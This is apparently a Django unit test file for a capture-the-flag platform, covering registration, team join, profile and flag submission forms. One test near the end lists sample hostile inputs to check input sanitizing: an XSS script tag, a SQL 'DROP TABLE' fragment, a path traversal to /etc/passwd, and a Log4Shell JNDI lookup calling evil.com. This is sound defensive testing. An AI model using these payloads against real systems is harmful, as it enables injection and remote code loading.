"""
Test forms for the CTF platform
Tests all form validation, processing, and error handling
"""
import unittest
from django.test import TestCase
from django.contrib.auth.models import User
from django.utils import timezone
from datetime import timedelta

from ctf.models import Category, Challenge, Team, UserProfile
from ctf.forms import (
    UserRegistrationForm, TeamRegistrationForm, TeamJoinForm, 
    UserProfileForm, SubmissionForm
)


class UserRegistrationFormTest(TestCase):
    """Test user registration form"""
    
    def test_valid_registration_form(self):
        """Test valid user registration data"""
        form_data = {
            'username': 'testuser',
            'email': 'test@example.com',
            'first_name': 'Test',
            'last_name': 'User',
            'password1': 'complexpassword123',
            'password2': 'complexpassword123'
        }
        form = UserRegistrationForm(data=form_data)
        self.assertTrue(form.is_valid())
    
    def test_password_mismatch(self):
        """Test password mismatch validation"""
        form_data = {
            'username': 'testuser',
            'email': 'test@example.com',
            'password1': 'complexpassword123',
            'password2': 'differentpassword'
        }
        form = UserRegistrationForm(data=form_data)
        self.assertFalse(form.is_valid())
        self.assertIn('password2', form.errors)
    
    def test_weak_password(self):
        """Test weak password validation"""
        form_data = {
            'username': 'testuser',
            'email': 'test@example.com',
            'password1': '123',
            'password2': '123'
        }
        form = UserRegistrationForm(data=form_data)
        self.assertFalse(form.is_valid())
        self.assertIn('password2', form.errors)
    
    def test_duplicate_username(self):
        """Test duplicate username validation"""
        # Create existing user
        User.objects.create_user(username='testuser', email='existing@example.com')
        
        form_data = {
            'username': 'testuser',
            'email': 'test@example.com',
            'password1': 'complexpassword123',
            'password2': 'complexpassword123'
        }
        form = UserRegistrationForm(data=form_data)
        self.assertFalse(form.is_valid())
        self.assertIn('username', form.errors)
    
    def test_duplicate_email(self):
        """Test duplicate email validation"""
        # Create existing user
        User.objects.create_user(username='existinguser', email='test@example.com')
        
        form_data = {
            'username': 'testuser',
            'email': 'test@example.com',
            'password1': 'complexpassword123',
            'password2': 'complexpassword123'
        }
        form = UserRegistrationForm(data=form_data)
        self.assertFalse(form.is_valid())
        self.assertIn('email', form.errors)
    
    def test_invalid_email_format(self):
        """Test invalid email format validation"""
        form_data = {
            'username': 'testuser',
            'email': 'invalid-email',
            'password1': 'complexpassword123',
            'password2': 'complexpassword123'
        }
        form = UserRegistrationForm(data=form_data)
        self.assertFalse(form.is_valid())
        self.assertIn('email', form.errors)
    
    def test_username_length_validation(self):
        """Test username length validation"""
        form_data = {
            'username': 'a' * 151,  # Too long
            'email': 'test@example.com',
            'password1': 'complexpassword123',
            'password2': 'complexpassword123'
        }
        form = UserRegistrationForm(data=form_data)
        self.assertFalse(form.is_valid())
        self.assertIn('username', form.errors)
    
    def test_required_fields(self):
        """Test that required fields are enforced"""
        form = UserRegistrationForm(data={})
        self.assertFalse(form.is_valid())
        self.assertIn('username', form.errors)
        self.assertIn('email', form.errors)
        self.assertIn('password1', form.errors)
        self.assertIn('password2', form.errors)


class TeamRegistrationFormTest(TestCase):
    """Test team registration form"""
    
    def test_valid_team_registration(self):
        """Test valid team registration data"""
        form_data = {
            'name': 'Test Team',
            'affiliation': 'Test University',
            'team_password': 'teampass123',
            'confirm_password': 'teampass123'
        }
        form = TeamRegistrationForm(data=form_data)
        self.assertTrue(form.is_valid())
    
    def test_password_mismatch(self):
        """Test password mismatch validation"""
        form_data = {
            'name': 'Test Team',
            'affiliation': 'Test University',
            'team_password': 'teampass123',
            'confirm_password': 'differentpass'
        }
        form = TeamRegistrationForm(data=form_data)
        self.assertFalse(form.is_valid())
        self.assertIn('confirm_password', form.errors)
    
    def test_duplicate_team_name(self):
        """Test duplicate team name validation"""
        # Create existing team
        Team.objects.create(name='Test Team', affiliation='Existing Org')
        
        form_data = {
            'name': 'Test Team',
            'affiliation': 'Test University',
            'team_password': 'teampass123',
            'confirm_password': 'teampass123'
        }
        form = TeamRegistrationForm(data=form_data)
        self.assertFalse(form.is_valid())
        self.assertIn('name', form.errors)
    
    def test_empty_team_name(self):
        """Test empty team name validation"""
        form_data = {
            'name': '',
            'affiliation': 'Test University',
            'team_password': 'teampass123',
            'confirm_password': 'teampass123'
        }
        form = TeamRegistrationForm(data=form_data)
        self.assertFalse(form.is_valid())
        self.assertIn('name', form.errors)
    
    def test_team_name_length(self):
        """Test team name length validation"""
        form_data = {
            'name': 'a' * 256,  # Too long
            'affiliation': 'Test University',
            'team_password': 'teampass123',
            'confirm_password': 'teampass123'
        }
        form = TeamRegistrationForm(data=form_data)
        self.assertFalse(form.is_valid())
        self.assertIn('name', form.errors)
    
    def test_short_password(self):
        """Test short password validation"""
        form_data = {
            'name': 'Test Team',
            'affiliation': 'Test University',
            'team_password': '123',
            'confirm_password': '123'
        }
        form = TeamRegistrationForm(data=form_data)
        self.assertFalse(form.is_valid())
        self.assertIn('team_password', form.errors)
    
    def test_required_fields(self):
        """Test required fields validation"""
        form = TeamRegistrationForm(data={})
        self.assertFalse(form.is_valid())
        self.assertIn('name', form.errors)
        self.assertIn('team_password', form.errors)
        self.assertIn('confirm_password', form.errors)
    
    def test_optional_affiliation(self):
        """Test that affiliation is optional"""
        form_data = {
            'name': 'Test Team',
            'team_password': 'teampass123',
            'confirm_password': 'teampass123'
        }
        form = TeamRegistrationForm(data=form_data)
        self.assertTrue(form.is_valid())
    
    def test_clean_name_whitespace(self):
        """Test team name whitespace handling"""
        form_data = {
            'name': '  Test Team  ',
            'affiliation': 'Test University',
            'team_password': 'teampass123',
            'confirm_password': 'teampass123'
        }
        form = TeamRegistrationForm(data=form_data)
        self.assertTrue(form.is_valid())
        self.assertEqual(form.cleaned_data['name'], 'Test Team')


class TeamJoinFormTest(TestCase):
    """Test team join form"""
    
    def setUp(self):
        self.team = Team.objects.create(
            name='Test Team',
            affiliation='Test Org',
            password_hash='pbkdf2_sha256$320000$dummy$hash'
        )
    
    def test_valid_team_join(self):
        """Test valid team join data"""
        form_data = {
            'team_name': 'Test Team',
            'team_password': 'teampass'
        }
        form = TeamJoinForm(data=form_data)
        # Note: Form validation would require password checking implementation
        self.assertIsInstance(form, TeamJoinForm)
    
    def test_nonexistent_team(self):
        """Test joining nonexistent team"""
        form_data = {
            'team_name': 'Nonexistent Team',
            'team_password': 'somepass'
        }
        form = TeamJoinForm(data=form_data)
        # Form should handle this in clean method
        self.assertIsInstance(form, TeamJoinForm)
    
    def test_empty_team_name(self):
        """Test empty team name validation"""
        form_data = {
            'team_name': '',
            'team_password': 'teampass'
        }
        form = TeamJoinForm(data=form_data)
        self.assertFalse(form.is_valid())
        self.assertIn('team_name', form.errors)
    
    def test_empty_password(self):
        """Test empty password validation"""
        form_data = {
            'team_name': 'Test Team',
            'team_password': ''
        }
        form = TeamJoinForm(data=form_data)
        self.assertFalse(form.is_valid())
        self.assertIn('team_password', form.errors)
    
    def test_required_fields(self):
        """Test required fields validation"""
        form = TeamJoinForm(data={})
        self.assertFalse(form.is_valid())
        self.assertIn('team_name', form.errors)
        self.assertIn('team_password', form.errors)


class UserProfileFormTest(TestCase):
    """Test user profile form"""
    
    def setUp(self):
        self.user = User.objects.create_user(
            username='testuser',
            email='test@example.com',
            password='testpass123'
        )
        self.profile = UserProfile.objects.get(user=self.user)
    
    def test_valid_profile_form(self):
        """Test valid profile form data"""
        form_data = {
            'display_name': 'Test User',
            'bio': 'I am a test user interested in cybersecurity.',
            'website': 'https://example.com',
            'twitter': 'testuser',
            'github': 'testuser'
        }
        form = UserProfileForm(data=form_data, instance=self.profile)
        self.assertTrue(form.is_valid())
    
    def test_empty_optional_fields(self):
        """Test that optional fields can be empty"""
        form_data = {
            'display_name': 'Test User'
        }
        form = UserProfileForm(data=form_data, instance=self.profile)
        self.assertTrue(form.is_valid())
    
    def test_invalid_website_url(self):
        """Test invalid website URL validation"""
        form_data = {
            'display_name': 'Test User',
            'website': 'not-a-url'
        }
        form = UserProfileForm(data=form_data, instance=self.profile)
        self.assertFalse(form.is_valid())
        self.assertIn('website', form.errors)
    
    def test_bio_length_limit(self):
        """Test bio length limit validation"""
        form_data = {
            'display_name': 'Test User',
            'bio': 'x' * 1001  # Assuming 1000 char limit
        }
        form = UserProfileForm(data=form_data, instance=self.profile)
        # This depends on model field max_length
        self.assertIsInstance(form, UserProfileForm)
    
    def test_display_name_required(self):
        """Test that display name is required"""
        form_data = {
            'bio': 'Test bio'
        }
        form = UserProfileForm(data=form_data, instance=self.profile)
        # Assuming display_name is required
        self.assertIsInstance(form, UserProfileForm)
    
    def test_social_media_handles(self):
        """Test social media handle validation"""
        form_data = {
            'display_name': 'Test User',
            'twitter': '@testuser',  # Should handle @ symbol
            'github': 'test-user-123'
        }
        form = UserProfileForm(data=form_data, instance=self.profile)
        self.assertTrue(form.is_valid())


class SubmissionFormTest(TestCase):
    """Test submission form"""
    
    def setUp(self):
        self.category = Category.objects.create(name='Web', description='Web challenges')
        self.challenge = Challenge.objects.create(
            title='Test Challenge',
            description='A test challenge',
            category=self.category,
            value=100,
            flag='flag{test_flag}',
            case_sensitive=False
        )
    
    def test_valid_submission_form(self):
        """Test valid submission form"""
        form_data = {
            'submitted_flag': 'flag{test_flag}'
        }
        form = SubmissionForm(data=form_data)
        self.assertTrue(form.is_valid())
    
    def test_empty_flag_submission(self):
        """Test empty flag submission validation"""
        form_data = {
            'submitted_flag': ''
        }
        form = SubmissionForm(data=form_data)
        self.assertFalse(form.is_valid())
        self.assertIn('submitted_flag', form.errors)
    
    def test_whitespace_flag_submission(self):
        """Test whitespace-only flag submission"""
        form_data = {
            'submitted_flag': '   '
        }
        form = SubmissionForm(data=form_data)
        self.assertFalse(form.is_valid())
        self.assertIn('submitted_flag', form.errors)
    
    def test_flag_length_validation(self):
        """Test flag length validation"""
        form_data = {
            'submitted_flag': 'x' * 1001  # Very long flag
        }
        form = SubmissionForm(data=form_data)
        # Should validate based on model field max_length
        self.assertIsInstance(form, SubmissionForm)
    
    def test_flag_format_validation(self):
        """Test flag format validation if implemented"""
        form_data = {
            'submitted_flag': 'invalid_flag_format'
        }
        form = SubmissionForm(data=form_data)
        # This depends on whether form implements format validation
        self.assertIsInstance(form, SubmissionForm)


class FormValidationIntegrationTest(TestCase):
    """Test form validation in integration scenarios"""
    
    def test_user_registration_creates_profile(self):
        """Test that user registration form properly creates profile"""
        form_data = {
            'username': 'testuser',
            'email': 'test@example.com',
            'first_name': 'Test',
            'last_name': 'User',
            'password1': 'complexpassword123',
            'password2': 'complexpassword123'
        }
        form = UserRegistrationForm(data=form_data)
        
        if form.is_valid():
            # Simulate saving process
            user_data = form.cleaned_data
            self.assertEqual(user_data['username'], 'testuser')
            self.assertEqual(user_data['email'], 'test@example.com')
    
    def test_team_form_password_hashing(self):
        """Test that team form properly handles password hashing"""
        form_data = {
            'name': 'Test Team',
            'affiliation': 'Test University',
            'team_password': 'teampass123',
            'confirm_password': 'teampass123'
        }
        form = TeamRegistrationForm(data=form_data)
        
        if form.is_valid():
            cleaned_data = form.cleaned_data
            self.assertEqual(cleaned_data['name'], 'Test Team')
            self.assertEqual(cleaned_data['team_password'], 'teampass123')
    
    def test_profile_form_with_existing_data(self):
        """Test profile form with existing user data"""
        user = User.objects.create_user(
            username='testuser',
            email='test@example.com'
        )
        profile = UserProfile.objects.get(user=user)
        profile.display_name = 'Original Name'
        profile.save()
        
        form_data = {
            'display_name': 'Updated Name',
            'bio': 'Updated bio'
        }
        form = UserProfileForm(data=form_data, instance=profile)
        
        if form.is_valid():
            self.assertEqual(form.cleaned_data['display_name'], 'Updated Name')
            self.assertEqual(form.cleaned_data['bio'], 'Updated bio')
    
    def test_concurrent_team_registration(self):
        """Test concurrent team registration with same name"""
        # Simulate concurrent registration attempts
        form_data = {
            'name': 'Popular Team Name',
            'affiliation': 'University A',
            'team_password': 'pass1',
            'confirm_password': 'pass1'
        }
        form1 = TeamRegistrationForm(data=form_data)
        
        form_data['affiliation'] = 'University B'
        form_data['team_password'] = 'pass2'
        form_data['confirm_password'] = 'pass2'
        form2 = TeamRegistrationForm(data=form_data)
        
        # Both forms should validate individually
        self.assertTrue(form1.is_valid())
        self.assertTrue(form2.is_valid())
        
        # But only one should succeed when saving
        # This would be handled at the model/database level
    
    def test_form_security_validation(self):
        """Test forms reject potentially malicious input"""
        malicious_inputs = [
            '<script>alert("xss")</script>',
            'DROP TABLE users;',
            '../../../etc/passwd',
            '${jndi:ldap://evil.com/x}'
        ]
        
        for malicious_input in malicious_inputs:
            # Test in username field
            form_data = {
                'username': malicious_input,
                'email': 'test@example.com',
                'password1': 'complexpassword123',
                'password2': 'complexpassword123'
            }
            form = UserRegistrationForm(data=form_data)
            
            # Form should either reject or sanitize the input
            if form.is_valid():
                # If valid, ensure the data is properly escaped/sanitized
                cleaned_username = form.cleaned_data['username']
                # This would depend on the form's clean methods
                self.assertIsInstance(cleaned_username, str)


if __name__ == '__main__':
    unittest.main()
